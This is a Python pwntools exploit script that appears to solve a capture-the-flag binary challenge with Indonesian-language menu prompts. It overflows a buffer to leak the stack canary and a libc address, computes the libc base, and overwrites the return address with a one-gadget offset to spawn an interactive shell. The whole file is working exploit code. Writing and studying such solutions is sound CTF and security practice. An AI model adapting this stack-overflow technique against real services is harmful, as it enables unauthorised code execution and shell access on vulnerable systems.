#!/usr/bin/python3
from pwn import *

# p = process(["../public/chall"])
p = remote("127.0.0.1",32780)
elf = ELF("../dist/chall")
libc = ELF("../dist/libc.so.6")

# context.log_level = 'debug'

pop_rdi = 0x0000000000001753

got_puts = elf.got['puts']
plt_puts = elf.plt['puts']
main_f = elf.symbols['main']

def ans(a,b):
    p.sendlineafter(b"Pilih: ",b"2")
    p.sendlineafter(b"pertanyaan: ",a)
    p.sendafter(b"Jawabanmu: ",b)

def cek():
    p.sendlineafter(b"Pilih: ",b"3")

def out():
    p.sendlineafter(b"Pilih: ",b"4")

p1 = b"A"*0x29

ans(b"5",p1)
cek()
p.recvuntil(b"A"*0x29)
leak_canary = u64(p.recv(7).rjust(8,b"\x00"))

log.info("Leak canary: " + hex(leak_canary))

p2 = b"B"*0x38

ans(b"5",p2)
cek()

p.recvuntil(b"B"*0x38)
leak_libc = u64(p.recv(6).ljust(8,b"\x00"))

libc.address = leak_libc - (libc.symbols["__libc_start_main"] + 231)

log.info("Leak libc base: " + hex(libc.address))

p3 = b"C"*0x28
p3 += p64(leak_canary)
p3 += b"D"*8
p3 += p64(libc.address+0x10a2fc)

ans(b"5",p3)
out()

p.interactive()